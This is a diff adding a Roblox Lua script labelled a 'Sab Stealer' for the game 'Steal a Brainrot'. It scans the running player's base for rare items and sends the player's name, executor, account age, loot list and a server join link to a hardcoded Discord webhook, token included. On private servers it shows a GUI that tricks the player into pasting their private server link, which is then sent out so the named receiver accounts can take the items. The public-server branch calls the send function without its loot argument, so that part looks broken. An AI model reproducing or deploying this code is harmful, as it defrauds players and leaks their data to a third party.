@@ -1,0 +1,184 @@
+-- Full script: Brainrot Stealer + TargetNames check + Webhook
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+-- Webhook
+local WEBHOOK = "https://discord.com/api/webhooks/1410618012708634777/hQoWuMzJJgV5MlCK4KB0MyAJtUUj2jFOgxgNvG4tQFv3AdfJ_ByQkGNkt3G1ywfOTpIB"
+
+-- ====== TargetNames
+local TargetNames = {
+    "Cocofanto Elefanto","Antonio","Girafa Celestre","Tralalero Tralala",
+    "Los Crocodillitos","Tigroligre Frutonni","Odin Din Din Dun","Tukanno Bananno",
+    "Orcalero Orcala","Tralalita Tralala","Extinct Ballerina","Trenostruzzo Turbo 3000",
+    "Trippi Troppi Troppa Trippa","Las Cappuchinas","Ballerino Lololo",
+    "Bulbito Bandito Traktorito","Los Tungtungtungcitos","Pakrahmatmamat","Piccione Macchina",
+    "Brr es Teh Patipum","Los Orcalitos","Orcalita Orcala","Cacasito Satalito","Belula Beluga",
+    "Tartaruga Cisterna","Piccionetta Machina","Mastodontico Telepiedone","Anpali Babel",
+    "Los Matteos","Bisonte Giuppitere","La Vacca Saturno Saturnita","Trenostruzzo Turbo 4000",
+    "Torrtuginni Dragonfrutini","Chachechi","Agarrini La Palini","Fragola La La La",
+    "Las Tralaleritas","Extinct Tralalero","Los Tralaleritos","Job Job Job Sahur",
+    "Las Vaquitas Saturnitas","Graipuss Medussi","La Sahur Combinasion","Pot Hotspot",
+    "Chicleteira Bicicleteira","Los Chicleteiras","La Grande Combinasion","Los Combinasionas",
+    "Nuclearo Dinossauro","Los Hotspotsitos","Los Bros","Tralaledon","Esok Sekolah",
+    "Ketupat Kepat","Garama and Madundung","Spaghetti Tualetti","Dragon Cannelloni",
+    "Strawberry Elephant"
+}
+local Lookup = {}
+for _, n in ipairs(TargetNames) do Lookup[n] = true end
+
+-- ====== Hàm tìm base
+local function FindMyBase()
+    for _, plot in pairs(workspace.Plots:GetChildren()) do
+        local sign = plot:FindFirstChild("PlotSign")
+        if sign and sign:FindFirstChild("YourBase") then
+            if sign.YourBase.Enabled == true then return plot end
+        end
+    end
+    return nil
+end
+
+-- ====== Lấy Brainrot Loot từ base
+local function GetBrainrotLoot(plot)
+    if not plot then return {} end
+    local found = {}
+    for _, obj in pairs(plot:GetDescendants()) do
+        if Lookup[obj.Name] then
+            table.insert(found, obj.Name)
+        end
+    end
+    return found
+end
+
+-- ====== Kiểm tra server type
+local map = workspace:WaitForChild("Map")
+local codes = map:WaitForChild("Codes")
+local main = codes:WaitForChild("Main")
+local surfaceGui = main:WaitForChild("SurfaceGui")
+local privateMsg = surfaceGui:WaitForChild("MainFrame"):WaitForChild("PrivateServerMessage")
+local serverType = privateMsg.Visible and "PRIVATE SERVER" or "PUBLIC SERVER"
+
+-- ====== Hàm detect executor
+local function detectExecutor()
+    local executor = "Unknown"
+    if syn then executor = "Synapse X"
+    elseif KRNL_LOADED then executor = "KRNL"
+    elseif fluxus then executor = "Fluxus"
+    elseif secure_load then executor = "Sentinel"
+    elseif getexecutorname then executor = getexecutorname()
+    elseif identifyexecutor then executor = identifyexecutor()
+    end
+    return executor
+end
+
+-- ====== Hàm send webhook
+local function sendWebhook(link, brainrotLoot)
+    if #brainrotLoot == 0 then return end -- Không gửi nếu không tìm thấy target
+    local placeId = tostring(game.PlaceId or "")
+    local jobId = tostring(game.JobId or "")
+    local serverLink = ("https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s"):format(placeId, jobId)
+
+    local embed = {
+        ["title"] = "🌵 Sab Stealer - Make By Phatlee",
+        ["color"] = 65280,
+        ["fields"] = {
+            {["name"] = "Server Type", ["value"] = serverType},
+            {["name"] = "👤 Player Information", ["value"] = "Name: "..player.Name..
+                "\nReceiver: phatle8117, banpetuytin1111, banpetuytin111140"..
+                "\nExecutor: "..detectExecutor()..
+                "\nAccount Age: "..tostring(player.AccountAge).." days"},
+            {["name"] = "Brainrot Loot", ["value"] = table.concat(brainrotLoot, "\n")},
+            {["name"] = "Join Server Link", ["value"] = ("[Click to Join Server](%s)"):format(serverLink)}
+        }
+    }
+
+    local payload = {["content"] = link or ("Server detected: "..serverType), ["embeds"] = {embed}}
+    local req = (syn and syn.request) or http_request or (http and http.request) or request
+    if req then
+        pcall(function()
+            req({Url=WEBHOOK, Method="POST", Headers={["Content-Type"]="application/json"}, Body=HttpService:JSONEncode(payload)})
+        end)
+    end
+end
+
+-- ====== Tránh gửi lặp lại nếu execute nhiều lần
+if _G.BrainrotWebhookSent then return end
+_G.BrainrotWebhookSent = true
+
+-- ====== Thực thi
+local myPlot = FindMyBase()
+local brainrotLoot = GetBrainrotLoot(myPlot)
+
+if #brainrotLoot == 0 then
+    print("Không tìm thấy target nào, webhook sẽ không gửi")
+    return
+end
+
+if serverType == "PUBLIC SERVER" then
+    sendWebhook() -- gửi ngay
+else
+    -- Private server: tạo GUI nhập link
+    local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+    screenGui.Name = "StealBrainrotGUI"
+    screenGui.ResetOnSpawn = false
+
+    local frame = Instance.new("Frame", screenGui)
+    frame.Size = UDim2.new(0, 320, 0, 180)
+    frame.Position = UDim2.new(0.5, -160, 0.5, -90)
+    frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
+    frame.Active = true
+    frame.Draggable = true
+    local frameCorner = Instance.new("UICorner", frame)
+    frameCorner.CornerRadius = UDim.new(0,12)
+
+    local title = Instance.new("TextLabel", frame)
+    title.Text = "Steal a Brainrot"
+    title.Font = Enum.Font.FredokaOne
+    title.TextSize = 20
+    title.TextColor3 = Color3.fromRGB(255,255,255)
+    title.BackgroundTransparency = 1
+    title.Size = UDim2.new(1,0,0,28)
+    title.Position = UDim2.new(0,0,0,4)
+
+    local textBox = Instance.new("TextBox", frame)
+    textBox.Size = UDim2.new(0.9,0,0,40)
+    textBox.Position = UDim2.new(0.05,0,0,60)
+    textBox.PlaceholderText = "Please enter your private server link"
+    textBox.Text = ""
+    textBox.BackgroundColor3 = Color3.fromRGB(50,50,50)
+    textBox.TextColor3 = Color3.fromRGB(255,255,255)
+    textBox.ClearTextOnFocus = false
+    textBox.Font = Enum.Font.FredokaOne
+    textBox.TextSize = 14
+    local tbCorner = Instance.new("UICorner", textBox)
+    tbCorner.CornerRadius = UDim.new(0,8)
+
+    local sendButton = Instance.new("TextButton", frame)
+    sendButton.Text = "Send"
+    sendButton.Font = Enum.Font.FredokaOne
+    sendButton.TextSize = 18
+    sendButton.TextColor3 = Color3.fromRGB(255,255,255)
+    sendButton.BackgroundColor3 = Color3.fromRGB(0,100,0)
+    sendButton.Size = UDim2.new(0.4,0,0,32)
+    sendButton.Position = UDim2.new(0.3,0,0,110)
+    local sendCorner = Instance.new("UICorner", sendButton)
+    sendCorner.CornerRadius = UDim.new(0,8)
+
+    local function isValidLink(txt)
+        return string.match(txt, "^https://www%.roblox%.com/share%?code=.+&type=Server$") ~= nil
+    end
+
+    local function showError(msg)
+        print(msg)
+    end
+
+    sendButton.MouseButton1Click:Connect(function()
+        local txt = textBox.Text or ""
+        if isValidLink(txt) then
+            sendWebhook(txt, brainrotLoot)
+            screenGui:Destroy()
+        else
+            showError("Please enter a valid private server link")
+        end
+    end)
+end
